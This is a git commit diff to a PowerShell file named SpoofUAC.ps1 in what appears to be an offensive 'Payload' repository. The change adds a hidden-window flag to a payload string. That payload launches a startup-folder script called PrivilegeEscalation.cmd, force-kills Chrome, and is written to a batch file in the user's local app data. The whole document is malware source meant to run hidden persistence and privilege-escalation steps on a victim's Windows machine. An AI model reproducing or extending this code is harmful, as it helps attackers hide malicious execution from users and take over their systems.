a7764c46776b5de6d3be676d33542edc183d000a
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-11-03 12:51:22 +0800

    Hidden

--- Payload/SpoofUAC.ps1
+++ Payload/SpoofUAC.ps1
@@ -1,5 +1,5 @@
 $Temp = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("LocalApplicationData"), "payload.bat")
-$Payload = 'powershell -command "Start-Process -FilePath \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.cmd\"; $chrome = Get-Process -name chrome; $chrome | ForEach-Object { Stop-Process -Name chrome -Force }"'
+$Payload = 'powershell -WindowStyle Hidden -command "Start-Process -FilePath \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrivilegeEscalation.cmd\"; $chrome = Get-Process -name chrome; $chrome | ForEach-Object { Stop-Process -Name chrome -Force }"'
 
 $Payload | Set-Content -Path $Temp
 
